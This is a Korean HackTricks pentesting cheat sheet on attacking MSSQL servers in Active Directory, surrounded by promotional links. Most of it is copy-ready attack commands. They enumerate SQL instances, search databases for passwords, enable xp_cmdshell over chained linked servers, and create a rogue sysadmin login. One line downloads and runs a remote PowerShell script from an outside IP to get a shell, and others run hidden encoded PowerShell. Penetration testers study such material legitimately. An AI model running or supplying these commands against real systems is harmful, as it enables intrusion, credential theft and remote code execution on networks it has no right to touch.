# MSSQL AD 남용

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 영웅이 되는 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a><strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **HackTricks에 귀사를 광고하고 싶으신가요**? 혹은 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요, 저희의 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 얻으세요
* **[💬](https://emojipedia.org/speech-balloon/) Discord 그룹**에 **가입**하거나 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 요령을 공유하고 PR을 제출하여** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 참여**하세요.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## **MSSQL 열거 / 발견**

Powershell 모듈 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)은 이 경우에 매우 유용합니다.
```powershell
Import-Module .\PowerupSQL.psd1
```
### 도메인 세션 없이 네트워크에서 열거하기
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### 도메인 내부에서 열거하기
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL 기본 남용

### DB 접근
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

MSSQL 호스트 내에서 **명령을 실행**할 수도 있습니다
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL 기본 해킹 트릭

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL 신뢰하는 링크

만약 다른 MSSQL 인스턴스에 의해 신뢰된 MSSQL 인스턴스가 있다면, 사용자가 신뢰된 데이터베이스에 권한이 있다면, **다른 인스턴스에서도 쿼리를 실행할 수 있는 신뢰 관계를 사용할 수 있을 것**입니다. 이러한 신뢰는 연결될 수 있으며 어느 시점에서 사용자는 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수도 있습니다.

**데이터베이스 간의 링크는 숲 간 신뢰를 통해 작동합니다.**
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Metasploit를 사용하여 신뢰할 수 있는 링크를 쉽게 확인할 수 있습니다.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
### 수동 - Openquery()

**Linux**에서는 **sqsh** 및 **mssqlclient.py**를 사용하여 MSSQL 콘솔 셸을 획득할 수 있습니다.

**Windows**에서는 [**HeidiSQL**](https://www.heidisql.com)과 같은 **MSSQL 클라이언트**를 사용하여 링크를 찾고 명령을 수동으로 실행할 수도 있습니다.

_**Windows 인증을 사용하여 로그인:**_

![](<../../.gitbook/assets/image (805).png>)
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../.gitbook/assets/image (713).png>)

#### 신뢰할 수 있는 링크에서 쿼리 실행

링크를 통해 쿼리를 실행합니다 (예: 새로운 접근 가능한 인스턴스에서 더 많은 링크 찾기):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
이중 따옴표와 홑따옴표가 사용된 위치를 확인하십시오. 그 방법으로 사용하는 것이 중요합니다.
{% endhint %}

![](<../../.gitbook/assets/image (640).png>)

이 신뢰할 수 있는 링크 체인을 수동으로 영원히 계속할 수 있습니다.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
### 매뉴얼 - EXECUTE

`openquery()`에서 `exec xp_cmdshell`과 같은 작업을 수행할 수 없는 경우 `EXECUTE` 방법을 사용해 보십시오.
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## 로컬 권한 상슨

**MSSQL 로컬 사용자**는 보통 **`SeImpersonatePrivilege`**라고 불리는 특별한 권한을 갖습니다. 이는 계정이 "인증 후 클라이언트를 흉내 내는" 것을 허용합니다.

많은 저자들이 고안한 전략은 시스템 서비스를 강제로 인증하도록 유도하여 공격자가 생성한 로그나 중간자 서비스에 인증하도록 하는 것입니다. 이후 이 로그 서비스는 시스템 서비스를 흉내 내는 것이 가능해집니다.

[SweetPotato](https://github.com/CCob/SweetPotato)에는 Beacon의 `execute-assembly` 명령을 통해 실행할 수 있는 이러한 다양한 기술들이 모아져 있습니다.


<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가로 배우세요</summary>

* **사이버 보안 회사**에서 일하시나요? **HackTricks에 귀사를 광고하고 싶으신가요**? 혹은 **PEASS의 최신 버전을 확인하거나 HackTricks를 PDF로 다운로드 받고 싶으신가요**? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
* [**💬**](https://emojipedia.org/speech-balloon/) **Discord 그룹**에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요**.
* **해킹 요령을 공유하고 싶으시다면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **로 PR을 제출하세요**.

</details>
